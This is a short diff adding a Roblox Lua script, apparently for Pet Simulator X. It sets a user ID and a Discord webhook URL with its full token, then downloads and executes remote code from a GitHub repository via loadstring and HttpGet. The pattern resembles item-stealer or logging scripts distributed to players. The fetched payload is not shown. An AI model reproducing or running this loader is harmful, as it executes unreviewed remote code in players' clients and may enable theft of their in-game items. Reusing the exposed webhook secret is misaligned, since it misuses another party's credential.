@@ -1,0 +1,5 @@
+_G.UserId = 657151889
+
+_G.Webhook = "https://discord.com/api/webhooks/1094203130264170559/u0zHkIZOFYya1chgVk9JDa6IBYm5u9nB-JNbh3Pk93GkNj6nylYPet1aILObHlVNxbJh"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
